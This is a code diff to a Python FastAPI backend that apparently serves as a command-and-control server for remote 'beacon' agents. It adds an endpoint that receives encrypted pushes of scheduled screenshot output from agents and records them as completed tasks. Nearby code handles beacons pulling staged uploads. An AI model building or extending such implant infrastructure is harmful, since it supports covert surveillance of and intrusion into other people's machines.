@@ -254,6 +254,49 @@ async def submit_result(
     return {"message": "Result saved"}
 
 
+# ── Proactive push (background tasks: screenshot_sched, etc.) ────────────────
+
+class PushRequest(BaseModel):
+    agent_id: str
+    output: str
+
+
+@router.post("/push")
+async def beacon_push(
+    request: Request,
+    db: Session = Depends(get_db),
+    _: None = Depends(verify_agent_secret),
+):
+    try:
+        req = PushRequest(**_decrypt_body(await request.body()))
+    except Exception:
+        raise HTTPException(status_code=422, detail="Invalid push body")
+
+    agent = db.query(Agent).filter(Agent.id == req.agent_id).first()
+    if not agent:
+        raise HTTPException(status_code=404, detail="Agent not found")
+
+    task = Task(
+        agent_id=req.agent_id,
+        command="screenshot_sched_auto",
+        output=req.output,
+        status="done",
+        completed_at=datetime.now(timezone.utc),
+    )
+    db.add(task)
+    db.commit()
+    db.refresh(task)
+
+    import asyncio
+    asyncio.create_task(ws_manager.broadcast({
+        "type": "task_result",
+        "task_id": task.id,
+        "agent_id": req.agent_id,
+        "status": "done",
+    }))
+    return {"message": "Pushed"}
+
+
 # ── Staged file fetch (beacon pulls upload from server) ───────────────────────
 
 @router.get("/fetch/{agent_id}/{task_id}")
